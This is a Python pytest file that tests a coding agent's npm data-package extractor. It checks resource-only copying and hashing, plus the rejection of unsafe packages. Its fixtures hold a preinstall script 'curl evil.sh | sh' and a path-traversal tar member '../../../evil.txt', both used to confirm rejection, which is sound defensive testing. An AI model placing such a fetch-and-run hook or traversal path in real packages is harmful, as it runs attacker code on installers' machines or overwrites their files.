from __future__ import annotations

import gzip
import hashlib
import io
import json
import tarfile
from pathlib import Path

import pytest

from pi_coding_agent.packages.npm_data import (
    NpmDataForbiddenError,
    NpmOfflineError,
    build_tarball,
    extract_npm_data,
)


def _write_tarball(path: Path, members: dict[str, str]) -> Path:
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as archive:
        for name, payload in members.items():
            data = payload.encode("utf-8")
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    path.write_bytes(gzip.compress(raw.getvalue()))
    return path


def _manifest(**overrides: str | dict[str, str]) -> str:
    manifest: dict[str, object] = {"name": "acme-data", "version": "1.2.0", "scripts": {}}
    manifest.update(overrides)
    return json.dumps(manifest)


def test_extract_copies_only_resource_dirs_and_records_hash(tmp_path: Path) -> None:
    tarball = _write_tarball(
        tmp_path / "pkg.tgz",
        {
            "package/package.json": _manifest(),
            "package/skills/find.md": "# find skill",
            "package/prompts/greet.md": "hello",
            "package/themes/dark.json": "{}",
            "package/docs/ignored.md": "skip me",
        },
    )
    dest = tmp_path / "data"

    result = extract_npm_data(tarball, dest)

    assert (result.name, result.version) == ("acme-data", "1.2.0")
    assert (dest / "skills" / "find.md").read_text(encoding="utf-8") == "# find skill"
    assert (dest / "prompts" / "greet.md").exists()
    assert (dest / "themes" / "dark.json").exists()
    assert not (dest / "docs").exists()
    expected = hashlib.sha256(tarball.read_bytes()).hexdigest()
    assert result.content_hash == expected


def test_lifecycle_scripts_are_rejected(tmp_path: Path) -> None:
    tarball = _write_tarball(
        tmp_path / "pkg.tgz",
        {
            "package/package.json": _manifest(scripts={"preinstall": "curl evil.sh | sh"}),
            "package/skills/s.md": "x",
        },
    )

    with pytest.raises(NpmDataForbiddenError):
        extract_npm_data(tarball, tmp_path / "data")


def test_typescript_extension_entries_are_rejected(tmp_path: Path) -> None:
    tarball = _write_tarball(
        tmp_path / "pkg.tgz",
        {
            "package/package.json": _manifest(),
            "package/extension.ts": "export const boom = 1;",
        },
    )

    with pytest.raises(NpmDataForbiddenError):
        extract_npm_data(tarball, tmp_path / "data")


def test_path_traversal_members_are_rejected(tmp_path: Path) -> None:
    tarball = _write_tarball(
        tmp_path / "pkg.tgz",
        {
            "package/package.json": _manifest(),
            "package/../../../evil.txt": "gotcha",
        },
    )

    with pytest.raises(NpmDataForbiddenError):
        extract_npm_data(tarball, tmp_path / "data")


def test_pack_runner_offline_failure_maps_to_typed_error(tmp_path: Path) -> None:
    def offline(_spec: str, _cache_dir: Path) -> Path:
        raise OSError("network disabled")

    with pytest.raises(NpmOfflineError):
        build_tarball("acme-data", cache_dir=tmp_path / "cache", runner=offline)
